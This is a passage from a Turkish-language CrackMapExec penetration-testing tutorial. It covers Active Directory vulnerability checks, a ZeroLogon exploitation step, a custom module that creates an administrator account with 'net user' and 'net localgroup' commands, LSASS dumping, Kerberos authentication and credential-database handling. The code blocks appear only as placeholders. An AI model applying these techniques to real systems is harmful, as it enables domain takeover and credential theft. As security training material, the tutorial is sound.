{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doğrulamasını kullanırken göz önünde bulundurulması gereken önemli bir unsur, saldırdığımız bilgisayarın domain ve hedef makinenin `FQDN`'sini çözümlemesi gerektiğidir. İnternal bir ağdaysak, bilgisayarımızı şirketin DNS'sine domain adı çözümlemeleri yapacak şekilde yapılandırabiliriz, ancak durum böyle değildir. DNS'i yapılandıramayız ve `/etc/hosts` dosyasına domain controller ve hedef makinemiz için FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doğrulaması ile kullanmayı deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi `Kerbrute`'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama

{{CODE_BLOCK_246}}

Gördüğümüz gibi, `Kerbrute` CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, `asreproast` saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce `AESREPRoast` Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.

Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos logu etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.


### AES-128 veya AES-256 kullanma

Ayrıca, Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araçlar, genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullandığımızda, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve bu da operasyonel bir avantaj (opsec) sağlayacaktır. Hadi Secretsdump'u kullanalım ve ardından AES256 ile kimlik doğrulaması yapalım.


### AES256 ile Kimlik Doğrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle servislere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.

Çoğu durumda, Linux makineleri Kerberos tickerları ccache dosyaları olarak depolar, sistemlerin ticketları kullanma şekli, `ccache` dosyasının yolunu gösteren `KRB5CCNAME` environment variable aracılığıyla olur. robert kullanıcısı için bir ticket (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım

Ticket'ı oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME environment variable'i getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

{{CODE_BLOCK_251}}


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

{{CODE_BLOCK_252}}

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

{{CODE_BLOCK_253}}

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

{{CODE_BLOCK_255}}

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

{{CODE_BLOCK_258}}


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

{{CODE_BLOCK_262}}

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

{{CODE_BLOCK_265}}


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

{{CODE_BLOCK_266}}

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


